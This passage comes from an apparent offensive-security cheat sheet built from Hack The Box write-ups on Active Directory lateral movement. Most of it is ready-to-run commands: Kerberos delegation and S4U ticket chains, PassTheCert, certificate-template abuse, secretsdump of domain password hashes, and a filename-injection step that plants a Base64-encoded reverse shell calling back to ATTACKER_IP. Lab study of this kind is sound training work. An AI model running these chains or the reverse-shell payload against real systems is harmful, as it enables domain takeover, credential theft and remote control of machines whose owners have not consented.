impacket-getST "$DOMAIN/EVIL01$:STRONG_TEMP_PASSWORD" -spn "cifs/$DC_FQDN" -impersonate Administrator -dc-ip "$DC_IP" | tee getst-rbcd.log

# Do not guess Impacket's generated filename; read the exact "Saving ticket in" value.
CCACHE=$(sed -n 's/.*Saving ticket in //p' getst-rbcd.log | tr -d '\r' | tail -n 1)
test -n "$CCACHE" -a -f "$CCACHE" || { echo 'getST did not create a ccache'; exit 1; }
export KRB5CCNAME="$(realpath "$CCACHE")"
klist
```

Failure interpretation:

- `KDC_ERR_BADOPTION`: the account is not delegable, the TGT is not forwardable, protocol transition is unavailable, the SPN is wrong, or an additional-ticket/two-ticket bridge is required.
- `Administrator` may be `NOT_DELEGATED`; impersonating a suitable Domain Admin or the DC computer and using `-altservice` can be required.
- RBCD tooling can fail on hostname resolution. Rebound requires the short DC hostname first in `/etc/hosts` before the FQDN.
- A normal `kinit` ticket may not be forwardable; use `kinit -f` when the chain requires it.

Cleanup: restore/remove the RBCD attribute and delete the temporary computer only after verifying no pre-existing value is overwritten.

#### Authority: PKINIT failure -> PassTheCert -> RBCD

If `certipy auth -pfx administrator_authority.pfx` returns `KDC_ERR_PADATA_TYPE_NOSUPP`, the DC does not support the required PKINIT path. Convert the issued PFX into a certificate/key pair and authenticate to LDAPS with Schannel instead:

```bash
openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key
openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt

python3 PassTheCert/Python/passthecert.py \
  -dc-ip "$DC_IP" -crt administrator.crt -key administrator.key \
  -domain "$DOMAIN" -port 636 -action write_rbcd \
  -delegate-to 'AUTHORITY$' -delegate-from 'EVIL01$'

impacket-getST -spn "cifs/$DC_FQDN" -impersonate Administrator \
  "$DOMAIN/EVIL01$:STRONG_TEMP_PASSWORD" -dc-ip "$DC_IP" | tee authority-getst.log
AUTHORITY_CCACHE=$(sed -n 's/.*Saving ticket in //p' authority-getst.log | tr -d '\r' | tail -n 1)
test -n "$AUTHORITY_CCACHE" -a -f "$AUTHORITY_CCACHE" || { echo 'Authority ccache missing'; exit 1; }
export KRB5CCNAME="$(realpath "$AUTHORITY_CCACHE")"
klist
impacket-secretsdump -k -no-pass "$DOMAIN/Administrator@$DC_FQDN" -just-dc-ntlm
```

The certificate does **not** grant direct DCSync rights. It writes RBCD so `EVIL01$` can delegate to `AUTHORITY$`; the CIFS service ticket is what enables the Kerberos-authenticated secrets dump. Record the original delegation attribute before writing it.

#### Rebound: short-hostname requirement and two-ticket bridge

Rebound is not a normal one-command RBCD path. Put the short hostname first or `rbcd.py` fails with `invalid server address`:

```bash
echo "$DC_IP dc01 $DC_FQDN $DOMAIN" | sudo tee -a /etc/hosts
getent hosts dc01 "$DC_FQDN"

impacket-rbcd "$DOMAIN/delegator$" -hashes ":$DELEGATOR_HASH" \
  -k \
  -delegate-from ldap_monitor -delegate-to 'delegator$' -action write \
  -dc-ip dc01 -use-ldaps
```

Administrator is `NOT_DELEGATED`, and the constrained-delegation account lacks protocol transition. Impersonate the DC computer through two service tickets instead:

```bash
# 1. ldap_monitor has an SPN: obtain a forwardable browser ticket for DC01$.
impacket-getST "$DOMAIN/ldap_monitor:$LDAP_MONITOR_PASS" \
  -spn "browser/$DC_FQDN" -impersonate 'DC01$' -dc-ip dc01 | tee rebound-step1.log
TICKET1=$(sed -n 's/.*Saving ticket in //p' rebound-step1.log | tr -d '\r' | tail -n 1)
test -n "$TICKET1" -a -f "$TICKET1" || { echo 'Rebound ticket 1 missing'; exit 1; }

# 2. Feed that forwardable ticket to delegator$ for S4U2Proxy to HTTP as DC01$.
impacket-getST "$DOMAIN/delegator$" -hashes ":$DELEGATOR_HASH" \
  -spn "http/$DC_FQDN" -additional-ticket "$TICKET1" \
  -impersonate 'DC01$' -dc-ip dc01 | tee rebound-step2.log
TICKET2=$(sed -n 's/.*Saving ticket in //p' rebound-step2.log | tr -d '\r' | tail -n 1)
test -n "$TICKET2" -a -f "$TICKET2" || { echo 'Rebound ticket 2 missing'; exit 1; }

export KRB5CCNAME="$(realpath "$TICKET2")"
klist
impacket-secretsdump -k -no-pass "$DC_FQDN" -just-dc-user Administrator
```

If step 2 returns `KDC_ERR_BADOPTION`, verify that ticket 1 is forwardable, the impersonated identity is `DC01$`, and the additional-ticket file is the exact ccache printed by step 1.

Sources: [Support](./htb-writeups/Support.md), [Authority](./htb-writeups/Authority.md), [Vintage](./htb-writeups/Vintage.md), [RustyKey](./htb-writeups/RustyKey.md), [Rebound](./htb-writeups/Rebound.md).

### AD CS as an identity transition

```bash
certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip "$DC_IP" -vulnerable -stdout
certipy find -u "$AUTH_USER@$DOMAIN" -hashes ":$NT_HASH" -dc-ip "$DC_IP" -vulnerable -stdout
certipy auth -pfx identity.pfx -dc-ip "$DC_IP"
```

Do not stop at “vulnerable template.” Record who can enroll, subject/SAN control, EKUs, manager approval, CA officer/ManageCA rights, issuance requirements, and whether PKINIT works.

- ESC1 can require a Domain Computer enrollment identity; check `MachineAccountQuota`.
- ESC7 can require adding the current user as officer and enabling/requesting SubCA.
- ESC9 ordering can matter: after issuing the Administrator certificate, restore the changed account UPN before authenticating the PFX.
- If the KDC returns `KDC_ERR_PADATA_TYPE_NOSUPP`, extract cert/key from the PFX and use PassTheCert over LDAPS/Schannel when the documented chain calls for it.

Escape-specific tooling detail: the Certify repository used by the writeup has no ready release executable. Open `Certify.sln` in Visual Studio, select a Release build, build the solution, then transfer the resulting `Certify.exe` before running:

```powershell
.\Certify.exe cas
.\Certify.exe find /vulnerable
```

Do not treat a missing GitHub release binary as evidence that AD CS enumeration is blocked.

Sources: [Escape](./htb-writeups/Escape.md), [Manager](./htb-writeups/Manager.md), [Certified](./htb-writeups/Certified.md), [Authority](./htb-writeups/Authority.md), [EscapeTwo](./htb-writeups/EscapeTwo.md).

## 9. Scheduled behavior and browser-mediated movement

- Identify the schedule, identity, input source, network behavior, and writable dependency before waiting.
- Use timestamps/process monitoring to confirm execution rather than guessing.
- Start the listener/capture before the next interval.

```bash
watch -n 1 'date; ps auxww | tail -n 20'
find /PATH -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort
```

Windows:

```powershell
Get-ScheduledTask | Get-ScheduledTaskInfo
while ($true) { Get-Process | Sort StartTime -Descending | Select -First 10; Start-Sleep 2 }
```

Audited cases:

- Networked: a three-minute `check_attack.php` job processes upload filenames. Build a URL-safe Base64 basename so the callback's `/dev/tcp/...` slashes never appear in the filename:

```bash
CALLBACK='bash -c "bash -i >& /dev/tcp/ATTACKER_IP/LISTEN_PORT 0>&1"'
URLSAFE_B64=$(printf '%s' "$CALLBACK" | base64 -w0 | tr '+/' '-_')
BASENAME=";python3 -c \"import base64,os;os.system(base64.urlsafe_b64decode('${URLSAFE_B64}').decode())\";"
[[ "$BASENAME" != */* ]] || { echo 'basename still contains a slash'; exit 1; }
touch -- "/var/www/html/uploads/$BASENAME"
ls -lb /var/www/html/uploads
```

  Start the listener before the next three-minute run. The full path contains normal directory separators; the attacker-controlled **basename** does not.
- Intelligence: the scheduled script runs every five minutes and requests DNS names beginning with `web`; add a matching ADIDNS record before starting capture.
- Browsed: a developer browser installs/executes an extension and can reach localhost-only routes.
- Markup: a writable batch file is periodically executed under Administrator context.

Sources: [Networked](./htb-writeups/Networked.md), [Intelligence](./htb-writeups/Intelligence.md), [Browsed](./htb-writeups/Browsed.md), [Markup](./htb-writeups/Markup.md).

## 10. Failure-to-pivot map

| Observation | Do not conclude | Next checks |
|---|---|---|
| Password fails over SSH | Credential is invalid | Test web app, SMB, WinRM, database-local auth, domain/local context, keyboard/Unicode. |
| New group added but access unchanged | ACL abuse failed | Start a new logon/session so the token contains the new SID; re-collect BloodHound. |
| WinRM cannot read DPAPI/CredMan | Store is empty | Use Type 2 interactive logon with profile; verify correct user/SID/masterkey. |
| `xp_cmdshell` identity lacks expected privilege | Account never had it | Check logon rights and create the required Type 5/service token. |
| Kerberos tool fails | Password/right is wrong | Check DNS, FQDN, `/etc/hosts`, time, ccache identity, SPN, forwardability, and logon session. |
| Tunnel connects but site is wrong/blank | Internal service is dead | Preserve Host header/SNI, use proxy DNS, add internal name, check IPv4/IPv6 bind. |
| Certipy finds no vulnerable template | AD CS is irrelevant | Inspect CA-level rights, disabled templates, officer rights, and alternate enrollment identities. |
| Valid Administrator hash + PsExec cannot read file | Hash is wrong | PsExec may be SYSTEM; use WMI/WinRM as Administrator when user-bound EFS/DPAPI is needed. |
| Container root obtained | Host root obtained | Enumerate mounts, sockets, network, host credentials, and actual host access separately. |
| Browser exists | Saved passwords exist | Distinguish extension-mediated localhost access, live process memory, and encrypted profile stores. |

## 11. Cleanup and evidence discipline

- [ ] Remove temporary group memberships, SPNs, shadow credentials, RBCD values, DNS records, machine accounts, CA officer changes, enabled templates, uploaded modules, and port forwards.
- [ ] Restore UPNs, owners, DACLs, service configurations, registry values, and files only from recorded originals.
- [ ] Do not delete a pre-existing attribute because your tool displayed only the injected value.
- [ ] Remove tickets/ccaches from the active environment and verify the current identity with `klist`/`whoami`.
- [ ] Stop listeners/tunnels and remove staged binaries/scripts.
- [ ] Keep hashes, keys, PFX files, browser stores, and DPAPI blobs out of the repository.

```bash
unset PASS NT_HASH KRB5CCNAME
ps -ef | grep -E '[c]hisel|[s]sh -N'   # identify the exact tunnel PID, then stop only that PID
```

## 12. Machine-source coverage

Every audited machine was reviewed while building this sheet. The clue after each link is the post-foothold/lateral lesson to search for; escalation execution itself belongs in `Privilege-Escalation.md`.

- [Markup](./htb-writeups/Markup.md) ([PDF](./htb-writeups/Markup.pdf)) — writable scheduled batch and ACL/process confirmation.
- [Busqueda](./htb-writeups/Busqueda.md) ([PDF](./htb-writeups/Busqueda.pdf)) — local Git config, hidden Gitea name, private repository, container environment.
- [Sau](./htb-writeups/Sau.md) ([PDF](./htb-writeups/Sau.pdf)) — immediate sudo/version/pager triage.
- [Help](./htb-writeups/Help.md) ([PDF](./htb-writeups/Help.pdf)) — exact kernel/build and shell stabilization.
- [Broker](./htb-writeups/Broker.md) ([PDF](./htb-writeups/Broker.pdf)) — sudo Nginx module/config/listener validation.
- [Soccer](./htb-writeups/Soccer.md) ([PDF](./htb-writeups/Soccer.pdf)) — Nginx hidden vhost, database credential reuse, doas/dstat plugin paths.
- [Keeper](./htb-writeups/Keeper.md) ([PDF](./htb-writeups/Keeper.pdf)) — KeePass memory recovery, Unicode, PuTTY conversion.
- [Networked](./htb-writeups/Networked.md) ([PDF](./htb-writeups/Networked.pdf)) — scheduled filename injection and shell-safe encoding.
- [BoardLight](./htb-writeups/BoardLight.md) ([PDF](./htb-writeups/BoardLight.pdf)) — product config password reused by a local user.
- [CozyHosting](./htb-writeups/CozyHosting.md) ([PDF](./htb-writeups/CozyHosting.pdf)) — JAR configuration, loopback PostgreSQL, hash reuse.
- [Editorial](./htb-writeups/Editorial.md) ([PDF](./htb-writeups/Editorial.pdf)) — Git history credential and privileged source review.
- [Pandora](./htb-writeups/Pandora.md) ([PDF](./htb-writeups/Pandora.pdf)) — Apache loopback vhost/tunnel and custom SUID inspection.
- [LinkVortex](./htb-writeups/LinkVortex.md) ([PDF](./htb-writeups/LinkVortex.pdf)) — sudo script TOCTOU analysis and environment preservation.
- [Dog](./htb-writeups/Dog.md) ([PDF](./htb-writeups/Dog.pdf)) — stabilize with SSH and enumerate an allowed CMS CLI.
- [Usage](./htb-writeups/Usage.md) ([PDF](./htb-writeups/Usage.pdf)) — loopback Monit, hidepid nuance, deterministic 7-Zip behavior.
- [Titanic](./htb-writeups/Titanic.md) ([PDF](./htb-writeups/Titanic.pdf)) — `/opt` scheduled script, writable working directory, timestamp confirmation.
- [Outbound](./htb-writeups/Outbound.md) ([PDF](./htb-writeups/Outbound.pdf)) — decrypt application session password, email reuse, sudo utility tracing.
- [Editor](./htb-writeups/Editor.md) ([PDF](./htb-writeups/Editor.pdf)) — XWiki configuration reuse and product-specific SUID helper.
- [Expressway](./htb-writeups/Expressway.md) ([PDF](./htb-writeups/Expressway.pdf)) — proxy-readable log reveals the sudo host argument.
- [ServMon](./htb-writeups/ServMon.md) ([PDF](./htb-writeups/ServMon.pdf)) — localhost NSClient++ tunnel and service restart rights.
- [Support](./htb-writeups/Support.md) ([PDF](./htb-writeups/Support.pdf)) — group GenericAll over DC -> RBCD.
- [Access](./htb-writeups/Access.md) ([PDF](./htb-writeups/Access.pdf)) — `/savecred`, DPAPI blobs, masterkeys, token constraint.
- [Heist](./htb-writeups/Heist.md) ([PDF](./htb-writeups/Heist.pdf)) — privileged browser process-memory recovery.
- [Active](./htb-writeups/Active.md) ([PDF](./htb-writeups/Active.pdf)) — Kerberoast the newly visible SPN and validate plaintext access.
- [Forest](./htb-writeups/Forest.md) ([PDF](./htb-writeups/Forest.pdf)) — nested groups, Account Operators, WriteDACL path.
- [Sauna](./htb-writeups/Sauna.md) ([PDF](./htb-writeups/Sauna.pdf)) — autologon credential -> new WinRM/BloodHound identity.
- [Return](./htb-writeups/Return.md) ([PDF](./htb-writeups/Return.pdf)) — Server Operators service-control boundary.
- [Timelapse](./htb-writeups/Timelapse.md) ([PDF](./htb-writeups/Timelapse.pdf)) — PSReadLine service credential -> LAPS reader.
- [Cicada](./htb-writeups/Cicada.md) ([PDF](./htb-writeups/Cicada.pdf)) — newly readable DEV backup script -> WinRM identity.
- [Fluffy](./htb-writeups/Fluffy.md) ([PDF](./htb-writeups/Fluffy.pdf)) — transitive group control and shadow credentials.
- [Eighteen](./htb-writeups/Eighteen.md) ([PDF](./htb-writeups/Eighteen.pdf)) — OU CreateChild, SOCKS to LDAP, Type 9 ticket session.
- [Escape](./htb-writeups/Escape.md) ([PDF](./htb-writeups/Escape.pdf)) — SQL logs leak a reused domain password; build Certify.
- [Monteverde](./htb-writeups/Monteverde.md) ([PDF](./htb-writeups/Monteverde.pdf)) — authenticated share `azure.xml` and local AD Connect SQL.
- [Cascade](./htb-writeups/Cascade.md) ([PDF](./htb-writeups/Cascade.pdf)) — TightVNC, logon script, hidden share, .NET crypto recovery.
- [TheFrizz](./htb-writeups/TheFrizz.md) ([PDF](./htb-writeups/TheFrizz.pdf)) — recycle-bin archive recovery and Kerberos SSH.
- [Puppy](./htb-writeups/Puppy.md) ([PDF](./htb-writeups/Puppy.pdf)) — website backup bind password and hidden AppData.
- [Voleur](./htb-writeups/Voleur.md) ([PDF](./htb-writeups/Voleur.pdf)) — restore deleted user, DPAPI, SSH key, Linux subsystem.
- [Signed](./htb-writeups/Signed.md) ([PDF](./htb-writeups/Signed.pdf)) — internal WinRMS listener and DNS-assisted reflection planning.
- [TombWatcher](./htb-writeups/TombWatcher.md) ([PDF](./htb-writeups/TombWatcher.pdf)) — deleted ADCS identity restoration and template re-enumeration.
- [UpDown](./htb-writeups/UpDown.md) ([PDF](./htb-writeups/UpDown.pdf)) — custom SUID Python transition and SSH key stabilization.
- [Magic](./htb-writeups/Magic.md) ([PDF](./htb-writeups/Magic.pdf)) — web config -> loopback MySQL -> local user.
- [Monitored](./htb-writeups/Monitored.md) ([PDF](./htb-writeups/Monitored.pdf)) — trace exact sudo script inputs/temp files.
- [Builder](./htb-writeups/Builder.md) ([PDF](./htb-writeups/Builder.pdf)) — Jenkins master key/Secret decryption and root-key credential material.
- [Browsed](./htb-writeups/Browsed.md) ([PDF](./htb-writeups/Browsed.pdf)) — extension-mediated localhost access, not browser-password dumping.
- [StreamIO](./htb-writeups/StreamIO.md) ([PDF](./htb-writeups/StreamIO.pdf)) — SQLCMD, Firefox profile pair, Core Staff, LDAP secret.
- [Intelligence](./htb-writeups/Intelligence.md) ([PDF](./htb-writeups/Intelligence.pdf)) — scheduled authenticated request, ADIDNS, gMSA.
- [Jeeves](./htb-writeups/Jeeves.md) ([PDF](./htb-writeups/Jeeves.pdf)) — KeePass entry contains an Administrator NT hash.
- [Manager](./htb-writeups/Manager.md) ([PDF](./htb-writeups/Manager.pdf)) — CA ManageCA/ESC7 despite no directly vulnerable template.
- [Aero](./htb-writeups/Aero.md) ([PDF](./htb-writeups/Aero.pdf)) — user document supplies the precise local CVE clue.
- [Administrator](./htb-writeups/Administrator.md) ([PDF](./htb-writeups/Administrator.pdf)) — iterative BloodHound ownership across multiple users.
- [Certified](./htb-writeups/Certified.md) ([PDF](./htb-writeups/Certified.pdf)) — separate ccaches through repeated shadow-credential transitions.
- [Mailing](./htb-writeups/Mailing.md) ([PDF](./htb-writeups/Mailing.pdf)) — exact installed desktop-app version.
- [Intentions](./htb-writeups/Intentions.md) ([PDF](./htb-writeups/Intentions.pdf)) — root-owned Git safe-directory workaround and scanner group.
- [Flight](./htb-writeups/Flight.md) ([PDF](./htb-writeups/Flight.pdf)) — RunasCs user context, internal IIS, writable web root.
- [Blackfield](./htb-writeups/Blackfield.md) ([PDF](./htb-writeups/Blackfield.pdf)) — Backup Operators and EFS-sensitive final context.
- [EscapeTwo](./htb-writeups/EscapeTwo.md) ([PDF](./htb-writeups/EscapeTwo.pdf)) — SQL service-password reuse -> WinRM -> BloodHound.
- [Mentor](./htb-writeups/Mentor.md) ([PDF](./htb-writeups/Mentor.pdf)) — container subnet, tunneled PostgreSQL, backup hash, host SSH.
- [Outdated](./htb-writeups/Outdated.md) ([PDF](./htb-writeups/Outdated.pdf)) — shadow credential to PSRemote identity and SMB exfiltration.
- [Atom](./htb-writeups/Atom.md) ([PDF](./htb-writeups/Atom.pdf)) — Redis-backed PortableKanban credential decryption.
- [Authority](./htb-writeups/Authority.md) ([PDF](./htb-writeups/Authority.pdf)) — ESC1 enrollment identity, PKINIT failure, certificate-over-LDAP/RBCD.
- [Clicker](./htb-writeups/Clicker.md) ([PDF](./htb-writeups/Clicker.pdf)) — custom SUID traversal reveals Jack's SSH key.
- [Cerberus](./htb-writeups/Cerberus.md) ([PDF](./htb-writeups/Cerberus.pdf)) — container SSSD hash, routed WinRM, hostname-preserving 9251 tunnel.
- [Cereal](./htb-writeups/Cereal.md) ([PDF](./htb-writeups/Cereal.pdf)) — SQLite credential, SSH user, loopback GraphQL.
- [Quick](./htb-writeups/Quick.md) ([PDF](./htb-writeups/Quick.pdf)) — Apache hidden printer vhost, source/DB hash, predictable job file.
- [Vintage](./htb-writeups/Vintage.md) ([PDF](./htb-writeups/Vintage.pdf)) — interactive DPAPI and post-group-change BloodHound.
- [RustyKey](./htb-writeups/RustyKey.md) ([PDF](./htb-writeups/RustyKey.pdf)) — local GPO parsing, denied network logon, registry DLL transition.
- [DarkZero](./htb-writeups/DarkZero.md) ([PDF](./htb-writeups/DarkZero.pdf)) — cross-domain SQL link and true Type 5 service token.
- [Absolute](./htb-writeups/Absolute.md) ([PDF](./htb-writeups/Absolute.pdf)) — ownership/group control, shadow credential, Type 9 relay session.
- [APT](./htb-writeups/APT.md) ([PDF](./htb-writeups/APT.pdf)) — local NTLMv1 policy and IPv6-only relay/coercion constraints.
- [Multimaster](./htb-writeups/Multimaster.md) ([PDF](./htb-writeups/Multimaster.pdf)) — CEF debugger -> DLL connection string -> spray.
- [Rebound](./htb-writeups/Rebound.md) ([PDF](./htb-writeups/Rebound.pdf)) — inherited OU ACL, shadow credential, cross-session relay, gMSA, delegation bridge.
